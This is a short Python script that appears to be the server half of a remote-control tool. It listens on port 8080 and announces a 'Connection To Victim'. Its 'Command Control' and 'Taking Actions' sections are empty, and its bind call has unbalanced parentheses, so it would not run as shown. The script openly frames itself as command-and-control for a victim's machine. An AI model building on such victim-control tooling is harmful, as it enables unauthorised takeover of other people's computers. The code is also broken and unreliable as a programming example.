import os
import socket

#Making A connection
s = socket.socket()
host = socket.gethostname()
port = 8080
s.bind(((host, port))
print("")
print(" Server Is Running ", host)
print("")
print("Waiting For The Vitctim's Connection")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, "Connection To Victim Is Successful : ")

#Command Control

#Taking Actions

